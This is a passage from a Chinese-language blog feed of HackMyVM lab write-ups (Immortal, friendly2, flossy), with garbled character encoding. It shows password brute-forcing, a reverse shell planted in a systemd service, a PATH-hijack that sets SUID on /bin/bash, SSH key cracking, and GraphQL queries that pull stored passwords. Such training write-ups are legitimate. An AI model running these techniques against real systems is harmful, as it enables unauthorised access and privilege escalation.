myfavouritebank
nintendo
123456
www-data@Immortal:/tmp$ echo 'f4ns0nly' &gt;&gt; pass 
www-data@Immortal:/tmp$ cat pass 
netflix
drake123
amazon
123drake
shelldred
shell123dred
system
kevcjnsgii
bank
myfavouritebank
nintendo
123456

f4ns0nly
```

ÈÇ£‰∏™Á©∫Ê†ºÊó†‰º§Â§ßÈõÖÔºåÊãñ‰∏™ **suForce** ÁàÜÁ†¥ÂØÜÁ†Å

```bash
www-data@Immortal:/tmp$ ./suForce -u drake -w pass 
            _____                  
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 code: d4t4s3c     version: v1.0.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üéØ Username | drake
üìñ Wordlist | pass
üîé Status   | 8/14/57%/kevcjnsgii
üí• Password | kevcjnsgii
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ


www-data@Immortal:/tmp$ su - drake   
```

*ps:Â¶ÇÊûúÂÆÉÊèêÁ§∫Ê≤°ÊúâÊâæÂà∞ÂØÜÁ†ÅÂèØ‰ª•Â§öËØïÂá†Ê¨°ÔºåÊàë‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÊàë suForce ÁöÑÈóÆÈ¢òÔºåÊàëÁöÑ‰ºöËØØÊä•*

```bash
drake@Immortal:/home$ sudo -l
Matching Defaults entries for drake on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drake may run the following commands on Immortal:
    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py

```

ÂèØ‰ª•Áî® **python3** ÊâßË°å`/opt/immortal.py`Ôºå`/opt/immortal.py` Êàë‰ª¨ÊúâÁºñËæëÊùÉÈôêÔºåÁõ¥Êé•ÊîπÂ∞±Â•Ω‰∫ÜÔºåÊàëÁî©‰∫Ü‰∏™ÂèçÂºπ shell ÂõûÂéª[ËÇ•ËÇ•Áò´]

```bash
eric@Immortal:~$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
eric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service
```

Êîπ‰∏™ÂèçÂºπ shell ‰∏äÂéª,Êü•ÁúãsudoÊùÉÈôê

```bash
eric@Immortal:~$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
eric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service
```

![image](https://github.com/user-attachments/assets/03c06f7b-54a5-44f4-9a93-6f98aa26aa5d)

Êää**ExecStart**ÊîπÊàê‰∫Ü**ÂèçÂºπshellÔºå**  ÈáçÂêØ‰∏Ä‰∏ãÊúçÂä°

```bash
eric@Immortal:~$ sudo /usr/bin/systemctl start immortal.service
```

ÁõëÂê¨

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8899
listening on [any] 8899 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 48726
bash: cannot set terminal process group (15372): Inappropriate ioctl for device
bash: no job control in this shell
root@Immortal:/# id
id
uid=0(root) gid=0(root) groups=0(root)

```

ÊàêÂäüÊãøÂà∞**root**ÊùÉÈôêsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Immortal.html</guid><pubDate>Fri, 27 Jun 2025 09:33:15 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPHK.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.138
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST
Nmap scan report for 192.168.205.138
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

```

# 2.Ë∏©ÁÇπ

![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)

Â∞ùËØïÁàÜÁ†¥ÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://192.168.205.138
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, html, txt, md]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET       91l      262w     2698c http://192.168.205.138/
301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
200      GET       91l      262w     2698c http://192.168.205.138/index.html
200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
[####################] - 2m    622895/622895  0s      found:13      errors:1      
[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
```

ÂÖ∂‰∏≠`/tools/`ÁõÆÂΩïÔºåÊàë‰ª¨ÊØîËæÉÊÑüÂÖ¥Ë∂£

![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)

Êúâ‰∏Ä‰∏™Áñë‰ººÁõÆÂΩïÂåÖÂê´Ë∑ØÂæÑÔºåÊàë‰ª¨Âä†‰∏äÂ∞ùËØï

![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)

ÂÜçÂ∞ùËØïÂèØ‰∏çÂèØ‰ª•‰ΩøÁî®**PHP ËøáÊª§Âô®Èìæ**

![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)

‰∏çË°åÔºåÈÇ£Êàë‰ª¨ËøòÊòØÂéªËØªÂÆÉÂØÜÈí•Âêß

![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ vim id_rsa 
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ chmod 600 id_rsa
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh gh0st@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh2john id_rsa &gt; hash                             
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john hash --show                                   
id_rsa:celtic

1 password hash cracked, 0 left
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh gh0st@192.168.205.138 -i id_rsa                
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ id
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)

```

# 3.ÊèêÊùÉ

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo 'Enter the string to encode:'
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo 'The string cannot be longer than 20 characters.'
  exit 1
fi

# Validate that the string does not contain special characters
if echo '$string' | grep -q '[^[:alnum:] ]'; then
  echo 'The string cannot contain special characters.'
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo '$string' | tr $sus1 $sus2)

echo 'Original string: $string'
echo 'Encoded string: $encoded_string'
gh0st@friendly2:~$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh

```

ÂÆûÁé∞Áî®Êà∑ËæìÂÖ•‰∏çË∂Ö20‰∏™Â≠óÁ¨¶‰∏î‰∏çËÉΩÊúâÁâπÊÆäÁ¨¶Âè∑ÔºåÂ∞ÜËæìÂÖ•‰ø°ÊÅØROT13 ÁºñÁ†ÅÔºåÊàë‰ª¨Êîπ‰∏™ÁéØÂ¢ÉÂèòÈáèÂ∞±Â•Ω‰∫ÜÔºåÂÆÉÊ≤°Áî®ÁªùÂØπË∑ØÂæÑ

```bash
gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
gh0st@friendly2:/tmp$ chmod +x grep 
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
Enter the string to encode:
aaassss
The string cannot contain special characters.
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# cat /root/
.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
bash-5.1# cat /root/root.txt 
Not yet! Try to find root.txt.


Hint: ...
bash-5.1# find / -name '...' 2&gt;/dev/null
/...
bash-5.1# cd /.../
bash-5.1# ls -al
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
bash-5.1# cat ebbg.txt 
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified

```

![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_friendly2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:10 +0000</pubDate></item><item><title>hmv_flossy</title><link>https://7r1UMPHK.github.io/post/hmv_flossy.html</link><description># hmv_flossy

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.138
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST
Nmap scan report for 192.168.205.138
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds

```

ÂÖàÁúã**80Á´ØÂè£**Ôºå**22Á´ØÂè£**ÂÄôË°•

# 2.Ë∏©ÁÇπ

![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)

‰∏Ä‰∏™Êü•ËØ¢È°µÈù¢ÔºåÂèØ‰ª•ËæìÂÖ•Êï∞ÂÄºËøõË°åÊü•ËØ¢ÔºåÊúâÊïàËåÉÂõ¥ÊòØ**1-99**ÔºåÂêéÈù¢ÁöÑÊï∞ÊçÆÊòØÈáçÂ§çÁöÑ„ÄÇÂ∞ùËØïsqlÊ≥®ÂÖ•

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sqlmap -u 'http://192.168.205.138' --forms --batch 
        ___
       __H__                                                                                                                         
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [.]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:44:38 /2025-01-17/

[16:44:38] [INFO] testing connection to the target URL
[16:44:38] [INFO] searching for forms
[16:44:38] [CRITICAL] there were no forms found at the given target URL

[*] ending @ 16:44:38 /2025-01-17/

```

‰∏çË°åÔºåÂ∞ùËØïÁâπÊÆäÁ¨¶Âè∑ÁªïËøáÔºåÊó†Êûú„ÄÇÊâ´ÊèèÊû∂ÊûÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nuclei -u http://192.168.205.138               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.pro
[graphql-field-suggestion] [http] [info] http://192.168.205.138/graphql
[graphql-alias-batching] [http] [info] http://192.168.205.138/graphql
[graphql-detect] [http] [info] http://192.168.205.138/graphql [paths='/graphql']
[waf-detect:securesphere] [http] [info] http://192.168.205.138
[ssh-password-auth] [javascript] [info] 192.168.205.138:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.138:22
[ssh-auth-methods] [javascript] [info] 192.168.205.138:22 ['['publickey','password']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.138:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2']
[CVE-2023-48795] [javascript] [medium] 192.168.205.138:22 ['Vulnerable to Terrapin']
[openssh-detect] [tcp] [info] 192.168.205.138:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2']
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.138
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.138
[tech-detect:express] [http] [info] http://192.168.205.138                                                                       
```

ÂèØ‰ª•ÁúãÂà∞Âíå**graphql**ÊúâÂÖ≥ÔºåÂéª[hacktricks](https://book.hacktricks.wiki/)ÊêúÁ¥¢‰ºöÊúâ‰∏ÄÁØá[Áõ∏ÂÖ≥ÁöÑÊñáÁ´†](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/graphql.html)

![Image](https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1)

ËøõË°åÂ∞ùËØï

![Image](https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a)

Á°ÆÂÆûÊòØ**GraphQL**ÊúçÂä°ÔºåËøõ‰∏ÄÊ≠•ÊµãËØï

```bash
POST /graphql HTTP/1.1
Host: 192.168.205.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.138/
Content-Type: application/json
Content-Length: 106
Origin: http://192.168.205.138
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

{'query':'{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}'}
```

![Image](https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5)

Â≠òÂú®**Áî®Êà∑Âêç**Âíå**ÂØÜÁ†Å**ÔºåÊàë‰ª¨Â∞ùËØïÊèêÂèñ

```bash
ÁúÅÁï•
{'query':'{users(id: 1) {username   password }}'}
```

![Image](https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab)

ÊãøÂéªÁàÜÁ†¥Ê®°ÂùóÁàÜÁ†¥

![Image](https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026)

Â∞ùËØïÁôªÂΩïssh

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh malo@192.168.205.138                        
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
malo@192.168.205.138's password: 
Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`

‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ id
uid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)
```

# 3.ÊèêÊùÉ

```bash
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
[sudo] password for malo: 
Sorry, user malo may not run sudo on flossy.
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ ls -la                                                                                                                         1 ‚Üµ
total 216
drwxr-xr-x  5 malo malo   4096 Jan 17 10:03 .
drwxr-xr-x  4 root root   4096 Oct  6  2023 ..
-rw-------  1 malo malo      4 Oct  7  2023 .bash_history
-rw-r--r--  1 malo malo    220 Oct  6  2023 .bash_logout
-rw-r--r--  1 malo malo   3526 Oct  6  2023 .bashrc
drwxr-xr-x  3 malo malo   4096 Oct  6  2023 .local
drwxr-xr-x 12 malo malo   4096 Oct  6  2023 .oh-my-zsh
-rw-r--r--  1 malo malo    807 Oct  6  2023 .profile
drwx------  2 malo malo   4096 Oct 10  2023 .ssh
-rw-r--r--  1 malo malo  51798 Jan 17 10:02 .zcompdump-flossy-5.9
-r--r--r--  1 malo malo 119920 Jan 17 10:02 .zcompdump-flossy-5.9.zwc
-rw-------  1 malo malo     63 Jan 17 10:03 .zsh_history
-rw-r--r--  1 malo malo   3890 Oct  6  2023 .zshrc
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ cat .bash_history
tty
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ cat .zsh_history           
: 1737104526:0;id
: 1737104577:0;sudo -l
: 1737104613:0;ls -la
: 1737104620:0;cat .bash_history
: 1737104635:0;cat .zsh_history
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ /sbin/getcap -r / 2&gt;/dev/null                                                                                                  1 ‚Üµ
/usr/bin/ping cap_net_raw=ep
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ ss -tuln | grep tcp
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*        
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      128             [::]:22           [::]:*        
‚ï≠‚îÄmalo@flossy ~ 
‚ï∞‚îÄ$ cd /home      
‚ï≠‚îÄmalo@flossy /home 
‚ï∞‚îÄ$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Oct  6  2023 .
drwxr-xr-x 18 root   root   4096 Jul 22  2023 ..
drwxr-xr-x  5 malo   malo   4096 Jan 17 10:06 malo
drwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 sophie
‚ï≠‚îÄmalo@flossy /home 
‚ï∞‚îÄ$ cd sophie 
‚ï≠‚îÄmalo@flossy /home/sophie 
‚ï∞‚îÄ$ ls -al
total 56
drwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 .
drwxr-xr-x  4 root   root   4096 Oct  6  2023 ..
-rw-------  1 root   root    370 Oct 10  2023 .bash_history
-rw-r--r--  1 sophie sophie  220 Oct  6  2023 .bash_logout
-rw-r--r--  1 sophie sophie 3526 Oct  6  2023 .bashrc
drwxr-xr-x  3 sophie sophie 4096 Oct  6  2023 .local
-rwxr-----  1 root   sophie  962 Oct  6  2023 network
drwxr-xr-x 12 sophie sophie 4096 Oct  6  2023 .oh-my-zsh
-rw-r--r--  1 sophie sophie  807 Oct  6  2023 .profile
-rw-r--r--  1 sophie sophie   66 Oct  7  2023 .selected_editor
drwx------  2 sophie sophie 4096 Oct 10  2023 .ssh
-rwxr-xr-x  1 sophie sophie  630 Oct 10  2023 SSHKeySync
